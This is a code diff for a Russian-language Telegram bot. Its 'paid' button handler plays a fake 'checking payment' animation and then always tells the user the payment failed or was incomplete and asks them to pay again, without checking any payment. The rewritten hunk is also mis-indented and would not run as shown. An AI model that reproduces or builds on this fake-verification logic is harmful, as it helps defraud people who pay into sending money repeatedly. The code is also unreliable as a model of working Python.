@@ -71,7 +71,6 @@ def run_command(message):
         return
 
     chat_id = message.chat.id
-    save_user(message)
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("Удалить ❌", callback_data="stop_run"))
@@ -85,10 +84,14 @@ def run_command(message):
         i = 0
         start_time = time.time()
 
-        while run_tasks.get(msg.message_id):
+        while True:
+            if not run_tasks.get(msg.message_id):
+                break
+
             if time.time() - start_time > 86400:
                 run_tasks[msg.message_id] = False
                 break
+
             try:
                 bot.edit_message_text(
                     f"{clocks[i % len(clocks)]} Бесконечная загрузка",
@@ -98,7 +101,8 @@ def run_command(message):
                 )
                 i += 1
             except:
-                break
+                pass
+
             time.sleep(3)
 
     threading.Thread(target=animate, daemon=True).start()
@@ -249,23 +253,38 @@ def callback_handler(call):
         start(call.message)
         return
     elif data == "paid":
-        clocks = ["🕛","🕐","🕑","🕒","🕓","🕔","🕧","🕖","🕗","🕘","🕙","🕚"]
-        msg_anim = bot.send_message(chat_id, "🕛 Проверка платежа...")
-        for i in range(33):
-            bot.edit_message_text(f"{clocks[i % len(clocks)]} Проверка платежа...", chat_id, msg_anim.message_id)
-            time.sleep(0.3)
+    clocks = ["🕛","🕐","🕑","🕒","🕓","🕔","🕧","🕖","🕗","🕘","🕙","🕚"]
+
+    msg_anim = bot.send_message(chat_id, "🕛 Проверка платежа...")
+
+    # Анимация 10 секунд
+    for i in range(10):
+        try:
+            bot.edit_message_text(
+                f"{clocks[i % len(clocks)]} Проверка платежа...",
+                chat_id,
+                msg_anim.message_id
+            )
+        except:
+            pass
+        time.sleep(1)
+
+    # Удаляем сообщение
+    try:
         bot.delete_message(chat_id, msg_anim.message_id)
+    except:
+        pass
 
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("Повторить 🔁", callback_data="retry"))
-        markup.add(types.InlineKeyboardButton("Отмена ❌", callback_data="cancel"))
+    # Сообщение об ошибке
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("Повторить 🔁", callback_data="retry"))
+    markup.add(types.InlineKeyboardButton("Отмена ❌", callback_data="cancel"))
 
-        msg = bot.send_message(chat_id,
-            "Извините, но платеж не прошел или пришла не вся сумма за выбранный тариф. 🙁\n\nПовторите платеж пожалуйста. 🙏",
-            reply_markup=markup
-        )
-
-    last_bot_messages[chat_id] = [msg.message_id]
+    msg = bot.send_message(
+        chat_id,
+        "Извините, но платеж не прошел или пришла не вся сумма за выбранный тариф. 🙁\n\nПовторите платеж пожалуйста. 🙏",
+        reply_markup=markup
+    )
 
 # ---------- Оплата ----------
 def send_payment(chat_id, price):
